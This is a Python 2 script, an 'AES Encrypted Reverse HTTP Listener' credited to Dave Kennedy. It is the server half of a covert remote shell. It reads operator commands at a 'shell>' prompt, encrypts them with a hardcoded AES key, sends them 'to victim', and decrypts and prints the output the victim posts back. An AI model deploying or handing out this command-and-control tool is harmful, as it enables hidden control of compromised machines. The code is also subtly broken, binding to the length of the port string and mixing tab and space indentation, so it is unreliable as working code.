#!/usr/bin/python
############################################
#
#
# AES Encrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     http://www.secmaniac.com
#
#
############################################
from BaseHTTPServer import BaseHTTPRequestHandler
from BaseHTTPServer import HTTPServer
import urlparse
import os, re, sys
import base64
from Crypto.Cipher import AES

if len(sys.argv) <=1:
    print("Must specify listening port!")
    sys.exit(0)
else:
    PORT = sys.argv[1]

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32
# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'
# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# 32 character secret key - change this if you want to be unique
secret = "Fj39@vF4@54&8dE@!)(*^+-pL;'dK3J2"

# create a cipher object using the random secret
cipher = AES.new(secret)

# url decode for postbacks
def htc(m):
    return chr(int(m.group(1),16))

# url decode
def urldecode(url):
    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
    return rex.sub(htc,url)

class GetHandler(BaseHTTPRequestHandler):

	# handle get request
	def do_GET(self):		

		# this will be our shell command
		message = raw_input("shell> ")
		# send a 200 OK response
        	self.send_response(200)
		# end headers
        	self.end_headers()
		# encrypt the message
		message = EncodeAES(cipher, message)
		# base64 it
		message = base64.b64encode(message)
		# write our command shell param to victim
        	self.wfile.write(message)
		# return out
        	return

	# handle post request
	def do_POST(self):

	        # send a 200 OK response
        	self.send_response(200)
		# # end headers
        	self.end_headers()
		# grab the length of the POST data
                length = int(self.headers.getheader('content-length'))
		# read in the length of the POST data
                qs = self.rfile.read(length)
		# url decode
                url=urldecode(qs)
                # remove the parameter cmd
                url=url.replace("cmd=", "")
		# base64 decode
		message = base64.b64decode(url)
		# decrypt the string
		message = DecodeAES(cipher, message)
		# display the command back decrypted
		print message

if __name__ == '__main__':

	# bind to all interfaces
    	server = HTTPServer(('', len(PORT)), GetHandler)
	print """############################################
#
#
# AES Encrypted Reverse HTTP Listener by:
#
#        Dave Kennedy (ReL1K)
#     http://www.secmaniac.com
#
#
############################################"""
    	print 'Starting encrypted web shell server, use <Ctrl-C> to stop'
	# simple try block
	try:
		# serve and listen forever
	    	server.serve_forever()
	# handle keyboard interrupts
	except KeyboardInterrupt: 
		print "[!] Exiting the encrypted webserver shell.. hack the gibson."
